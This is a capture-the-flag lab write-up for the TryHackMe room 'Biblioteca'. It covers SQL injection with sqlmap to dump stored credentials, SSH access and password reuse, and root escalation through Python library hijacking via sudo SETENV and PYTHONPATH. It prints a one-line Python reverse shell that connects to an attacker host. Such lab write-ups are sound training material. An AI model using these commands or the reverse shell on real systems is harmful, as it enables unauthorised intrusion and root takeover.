---
description: https://tryhackme.com/room/biblioteca
---

# Biblioteca

## Nmap

```
sudo nmap 10.10.198.83 -p- -sS -sV       

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Starting out we hit port 8000 which is running `werkzeug`. Looking up the version number on `searchsploit` shows no exploits available.

The root page of the web server shows us a login page.

![](<../../../.gitbook/assets/image (537).png>)

Using the link at the bottom of the page we move over to a registration form. Signing up with an account is successful.

![](<../../../.gitbook/assets/image (1340).png>)

We are then able to login with our newly created account.

![](<../../../.gitbook/assets/image (1197).png>)

However, from here I was unable to enumerate further files or directories. After running exhaustive searches I then started ZAP Proxy. Using the active scan feature, ZAP flags a SQL injection on the web server login page.

Firstly we save the login request in ZAP to the attacking computer.

![](<../../../.gitbook/assets/image (2039).png>)

Then use it in conjunction with `sqlmap` as shown below.

```bash
sqlmap -r request.raw --batch -D website -T users --dump
```

Building the right command to dump the users table of the website database we see stored credentials for the user smokey.

![](<../../../.gitbook/assets/image (216).png>)

Where, we are able to login over SSH with the found credentials.

```bash
ssh smokey@<IP>
```

![](<../../../.gitbook/assets/image (112).png>)

Viewing the home directories we notice the presence of the user _hazel_. We also find we are able to `su` over to hazel using her username as the password. We are also able to also login over `SSH` with the same credentials.

![](<../../../.gitbook/assets/image (198).png>)

Checking `sudo -l` we notice that we are able to run `/home/hazel/hasher.py` with the python3 binary as root, without specifying a password. Interestingly, the value `SETENV:` also dictates that we are able to change the `PYTHONPATH` environmental variable.

![](<../../../.gitbook/assets/image (1684).png>)

The exploit method here is known as :thumbsup::thumbsup:python library hijacking". I have linked a well written article below, which serves as a basis for the exploit bath on this page.

**URL** [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

Essentially, `SETENV:` allows us to change the environmental path for where python searches for modules.

Reading the contents of `hasher.py` we see the script imports the module hashlib. We can create a python reverse shell called `hashlib.py` in the `/tmp` directory. After doing so, we can run the sudo command and set where the PYTHONPATH looks first when attempt to load external modules references in `hasher.py`, this should execute our reverse shell.

Create a new `hashlib.py` file in `/tmp` with the following contents.

```python
import os
os.system("whoami")
```

Then test

```
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

![](<../../../.gitbook/assets/image (108).png>)

With confirmed root execution we then replace the contents of `/tmp/hashlib.py` with a python3 reverse shell and catch on our attacking system with a `netcat` listener.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![](<../../../.gitbook/assets/image (194).png>)
